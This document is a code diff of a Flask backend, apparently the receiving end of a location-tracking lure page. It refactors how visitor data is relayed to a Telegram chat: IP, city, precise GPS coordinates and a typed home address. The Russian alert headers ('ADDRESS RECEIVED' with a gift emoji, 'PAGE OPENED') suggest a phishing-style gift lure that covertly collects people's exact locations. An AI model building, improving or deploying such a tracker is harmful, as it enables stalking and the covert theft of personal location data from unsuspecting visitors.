@@ -1,12 +1,9 @@
 import os
 import logging
 import requests
-from telegram import Bot
 from dotenv import load_dotenv
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import asyncio
-import threading
 
 load_dotenv()
 
@@ -18,33 +15,30 @@ logger = logging.getLogger(__name__)
 
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 YOUR_CHAT_ID = os.getenv('CHAT_ID')
-
-bot = Bot(token=BOT_TOKEN)
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
 app = Flask(__name__)
 CORS(app)
 
-def send_telegram_in_thread(chat_id: str, message: str):
-    """Send message in separate thread with new event loop"""
-    def run_async():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            loop.run_until_complete(
-                bot.send_message(chat_id=chat_id, text=message, parse_mode='HTML')
-            )
+def send_telegram_message_direct(chat_id: str, message: str):
+    """Send message using requests library (synchronous)"""
+    try:
+        payload = {
+            'chat_id': chat_id,
+            'text': message,
+            'parse_mode': 'HTML'
+        }
+        response = requests.post(TELEGRAM_API_URL, json=payload, timeout=10)
+        
+        if response.status_code == 200:
             logger.info(f"Message sent to {chat_id}")
             return True
-        except Exception as e:
-            logger.error(f"Error sending message: {e}")
+        else:
+            logger.error(f"Telegram API error: {response.status_code} - {response.text}")
             return False
-        finally:
-            loop.close()
-    
-    thread = threading.Thread(target=run_async)
-    thread.start()
-    thread.join(timeout=10)
-    return True
+    except Exception as e:
+        logger.error(f"Error sending message: {e}")
+        return False
 
 def get_address_from_coordinates(lat, lon):
     try:
@@ -109,6 +103,8 @@ def notify():
         gps_accuracy = data.get('gpsAccuracy')
         has_gps = data.get('hasGPS', False)
         
+        logger.info(f"Received notification: type={message_type}, has_gps={has_gps}, gps=({gps_lat}, {gps_lon})")
+        
         # Get IP-based address
         ip_address_info = {'short': 'N/A', 'full': 'N/A', 'success': False}
         if loc and loc != 'N/A':
@@ -134,8 +130,7 @@ def notify():
         
         # Build message
         if address:  # User entered address
-            message = f"""
-<b>🎁 АДРЕС ПОЛУЧЕН!</b>
+            message = f"""<b>🎁 АДРЕС ПОЛУЧЕН!</b>
 
 📮 <b>Введенный адрес:</b>
 {address}
@@ -146,8 +141,7 @@ def notify():
             # Add GPS info if available
             if has_gps and gps_lat and gps_lon:
                 accuracy_text = f"±{int(gps_accuracy)}м" if gps_accuracy else "N/A"
-                message += f"""
-<b>📍 ТОЧНОЕ МЕСТОПОЛОЖЕНИЕ (GPS):</b>
+                message += f"""<b>📍 ТОЧНОЕ МЕСТОПОЛОЖЕНИЕ (GPS):</b>
 
 🏠 <b>Адрес:</b> {gps_address_info['short']}
 
@@ -161,8 +155,7 @@ def notify():
 ━━━━━━━━━━━━━━━━━━━━━
 """
             
-            message += f"""
-<b>🌐 IP ИНФОРМАЦИЯ:</b>
+            message += f"""<b>🌐 IP ИНФОРМАЦИЯ:</b>
 
 IP: <code>{ip}</code>
 Город: {city}
@@ -172,8 +165,7 @@ IP: <code>{ip}</code>
 Время: {timestamp}
 """
         else:  # Page opened (no address entered)
-            message = f"""
-<b>{message_type}</b>
+            message = f"""<b>{message_type}</b>
 
 ━━━━━━━━━━━━━━━━━━━━━
 """
@@ -181,8 +173,7 @@ IP: <code>{ip}</code>
             # Add GPS info if available
             if has_gps and gps_lat and gps_lon:
                 accuracy_text = f"±{int(gps_accuracy)}м" if gps_accuracy else "N/A"
-                message += f"""
-<b>📍 ТОЧНОЕ МЕСТОПОЛОЖЕНИЕ (GPS):</b>
+                message += f"""<b>📍 ТОЧНОЕ МЕСТОПОЛОЖЕНИЕ (GPS):</b>
 
 🏠 <b>Адрес:</b> {gps_address_info['short']}
 
@@ -196,8 +187,7 @@ IP: <code>{ip}</code>
 ━━━━━━━━━━━━━━━━━━━━━
 """
             
-            message += f"""
-<b>🌐 IP ИНФОРМАЦИЯ:</b>
+            message += f"""<b>🌐 IP ИНФОРМАЦИЯ:</b>
 
 🏠 <b>Примерный адрес (по IP):</b> {ip_address_info['short']}
 
@@ -212,7 +202,7 @@ IP: <code>{ip}</code>
 <i>⚠️ IP показывает местоположение провайдера, не точный адрес</i>
 """
         
-        result = send_telegram_in_thread(YOUR_CHAT_ID, message)
+        result = send_telegram_message_direct(YOUR_CHAT_ID, message)
         
         if result:
             return jsonify({'success': True, 'message': 'Notification sent'}), 200
@@ -230,6 +220,7 @@ def health():
 def main():
     logger.info("Starting Flask server with GPS support...")
     logger.info(f"Your Chat ID: {YOUR_CHAT_ID}")
+    logger.info("Using direct HTTP requests (no async)")
     
     port = int(os.getenv('PORT', 10000))
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
